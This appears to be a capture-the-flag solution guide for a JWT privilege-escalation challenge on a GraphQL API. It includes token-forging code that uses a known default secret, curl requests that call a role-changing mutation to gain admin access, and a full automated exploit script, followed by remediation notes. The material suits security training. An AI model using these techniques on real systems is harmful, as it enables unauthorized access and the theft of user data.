# CTF Challenge Solution Guide

## 🎯 Challenge: JWT Privilege Escalation

This document provides a complete solution walkthrough for the Apollo GraphQL JWT privilege escalation CTF challenge.

## 📋 Challenge Summary

**Objective**: Gain admin access to retrieve sensitive information from the GraphQL API.

**Vulnerability**: JWT token forging + privilege escalation through `updateMyRole` mutation.

## 🔍 Step-by-Step Solution

### Step 1: Reconnaissance

First, explore the GraphQL schema to understand available queries and mutations:

```bash
# Access the GraphQL Playground
curl -X POST https://4000-ihbuvsewwq89vw5dzkq46-278bf4c2.manus.computer/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query IntrospectionQuery { __schema { queryType { name fields { name description } } mutationType { name fields { name description } } } }"}'
```

**Key Findings**:
- `updateMyRole` mutation exists (suspicious!)
- `adminStats` query requires admin role
- JWT authentication is used

### Step 2: Analyze JWT Implementation

From the source code or documentation, we discover:
- **JWT Secret**: `your-super-secret-jwt-key-change-this-in-production`
- **Algorithm**: HS256
- **Payload Structure**: `{"userId": <id>, "iat": <timestamp>, "exp": <timestamp>}`

### Step 3: Forge a Valid JWT Token

#### Method 1: Using Python
```python
import jwt
import time

# The exposed JWT secret
secret = "your-super-secret-jwt-key-change-this-in-production"

# Create payload for user ID 1 (ctf_user)
payload = {
    "userId": 1,
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600  # 1 hour from now
}

# Generate the forged token
forged_token = jwt.encode(payload, secret, algorithm="HS256")
print(f"Forged JWT Token: {forged_token}")
```

#### Method 2: Using Node.js
```javascript
const jwt = require('jsonwebtoken');

const secret = 'your-super-secret-jwt-key-change-this-in-production';
const payload = {
    userId: 1,
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + 3600
};

const forgedToken = jwt.sign(payload, secret);
console.log('Forged JWT Token:', forgedToken);
```

#### Method 3: Using jwt.io
1. Go to [jwt.io](https://jwt.io)
2. Set algorithm to HS256
3. Set payload: `{"userId":1,"iat":1640995200,"exp":1641600000}`
4. Set secret: `your-super-secret-jwt-key-change-this-in-production`
5. Copy the generated token

### Step 4: Test Authentication

Verify the forged token works:

```bash
curl -X POST https://4000-ihbuvsewwq89vw5dzkq46-278bf4c2.manus.computer/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsImlhdCI6MTY0MDk5NTIwMCwiZXhwIjoxNjQxNjAwMDAwfQ.Xy5mGj4mJonJvgSXfBoOCqM6hNPN62iSqtrldODJPc0" \
  -d '{"query": "query { me { id username role } }"}'
```

**Expected Response**:
```json
{
  "data": {
    "me": {
      "id": "1",
      "username": "ctf_user",
      "role": "user"
    }
  }
}
```

### Step 5: Escalate Privileges

Use the vulnerable `updateMyRole` mutation:

```bash
curl -X POST https://4000-ihbuvsewwq89vw5dzkq46-278bf4c2.manus.computer/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_FORGED_TOKEN" \
  -d '{"query": "mutation { updateMyRole(newRole: admin) { id username role } }"}'
```

**Expected Response**:
```json
{
  "data": {
    "updateMyRole": {
      "id": "1",
      "username": "ctf_user",
      "role": "admin"
    }
  }
}
```

### Step 6: Access Admin Endpoints

Now that you have admin privileges, access sensitive data:

```bash
curl -X POST https://4000-ihbuvsewwq89vw5dzkq46-278bf4c2.manus.computer/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_FORGED_TOKEN" \
  -d '{"query": "query { adminStats { totalUsers totalPosts adminUsers { id username email role } } }"}'
```

**Expected Response**:
```json
{
  "data": {
    "adminStats": {
      "totalUsers": 2,
      "totalPosts": 1,
      "adminUsers": [
        {
          "id": "1",
          "username": "ctf_user",
          "email": "user@ctf.local",
          "role": "admin"
        },
        {
          "id": "2",
          "username": "ctf_admin",
          "email": "admin@ctf.local",
          "role": "admin"
        }
      ]
    }
  }
}
```

### Step 7: Retrieve All Users (Bonus)

Access the complete user list:

```bash
curl -X POST https://4000-ihbuvsewwq89vw5dzkq46-278bf4c2.manus.computer/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_FORGED_TOKEN" \
  -d '{"query": "query { users { id username email role created_at } }"}'
```

## 🛠️ Complete Exploit Script

Here's a complete Python script that automates the entire exploit:

```python
#!/usr/bin/env python3
import jwt
import time
import requests
import json

# Configuration
API_URL = "https://4000-ihbuvsewwq89vw5dzkq46-278bf4c2.manus.computer/graphql"
JWT_SECRET = "your-super-secret-jwt-key-change-this-in-production"

def forge_jwt_token(user_id=1):
    """Forge a JWT token for the given user ID"""
    payload = {
        "userId": user_id,
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600  # 1 hour expiry
    }
    
    token = jwt.encode(payload, JWT_SECRET, algorithm="HS256")
    return token

def graphql_request(query, token=None):
    """Make a GraphQL request"""
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    
    response = requests.post(
        API_URL,
        headers=headers,
        json={"query": query}
    )
    
    return response.json()

def main():
    print("🎯 Starting JWT Privilege Escalation CTF Challenge")
    print("=" * 50)
    
    # Step 1: Forge JWT token
    print("1. Forging JWT token...")
    token = forge_jwt_token(user_id=1)
    print(f"   Forged token: {token[:50]}...")
    
    # Step 2: Test authentication
    print("\n2. Testing authentication...")
    me_query = "query { me { id username role } }"
    result = graphql_request(me_query, token)
    
    if "errors" in result:
        print(f"   ❌ Authentication failed: {result['errors']}")
        return
    
    user_info = result["data"]["me"]
    print(f"   ✅ Authenticated as: {user_info['username']} (role: {user_info['role']})")
    
    # Step 3: Escalate privileges
    print("\n3. Escalating privileges...")
    escalate_query = "mutation { updateMyRole(newRole: admin) { id username role } }"
    result = graphql_request(escalate_query, token)
    
    if "errors" in result:
        print(f"   ❌ Privilege escalation failed: {result['errors']}")
        return
    
    updated_user = result["data"]["updateMyRole"]
    print(f"   ✅ Role updated: {updated_user['username']} is now {updated_user['role']}")
    
    # Step 4: Access admin data
    print("\n4. Accessing admin data...")
    admin_query = """
    query {
        adminStats {
            totalUsers
            totalPosts
            adminUsers {
                id
                username
                email
                role
            }
        }
    }
    """
    
    result = graphql_request(admin_query, token)
    
    if "errors" in result:
        print(f"   ❌ Admin access failed: {result['errors']}")
        return
    
    admin_stats = result["data"]["adminStats"]
    print(f"   ✅ Admin access successful!")
    print(f"   📊 Total Users: {admin_stats['totalUsers']}")
    print(f"   📊 Total Posts: {admin_stats['totalPosts']}")
    print(f"   👥 Admin Users:")
    
    for admin_user in admin_stats['adminUsers']:
        print(f"      - {admin_user['username']} ({admin_user['email']})")
    
    # Step 5: Get all users
    print("\n5. Retrieving all users...")
    users_query = "query { users { id username email role created_at } }"
    result = graphql_request(users_query, token)
    
    if "errors" not in result:
        users = result["data"]["users"]
        print(f"   ✅ Retrieved {len(users)} users:")
        for user in users:
            print(f"      - {user['username']} ({user['email']}) - {user['role']}")
    
    print("\n🏆 Challenge completed successfully!")
    print("🎉 You have successfully exploited the JWT privilege escalation vulnerability!")

if __name__ == "__main__":
    main()
```

## 🔍 Vulnerability Analysis

### Root Causes

1. **Weak JWT Secret**: The secret is exposed and predictable
2. **Missing Authorization**: No validation on role changes
3. **Information Disclosure**: Sensitive configuration exposed
4. **Insufficient Input Validation**: Role changes not properly validated

### Security Impact

- **Confidentiality**: Unauthorized access to sensitive user data
- **Integrity**: Ability to modify user roles without authorization
- **Availability**: Potential for privilege escalation attacks

### Remediation

1. **Use Strong Secrets**: Generate cryptographically secure random secrets
2. **Implement Proper RBAC**: Only admins should modify user roles
3. **Validate Inputs**: Implement proper authorization checks
4. **Secure Configuration**: Never expose secrets in documentation

## 🎓 Learning Outcomes

After completing this challenge, participants should understand:

- JWT token structure and vulnerabilities
- The importance of strong cryptographic secrets
- Role-based access control implementation
- GraphQL security considerations
- Common privilege escalation techniques

## 🏁 Flag/Success Indicator

The challenge is considered complete when you can:
1. ✅ Successfully forge a valid JWT token
2. ✅ Authenticate with the forged token
3. ✅ Escalate privileges from 'user' to 'admin'
4. ✅ Access admin-only endpoints (`adminStats`, `users`)
5. ✅ Retrieve sensitive administrative information

**Congratulations! You've successfully completed the JWT Privilege Escalation CTF challenge! 🎉**

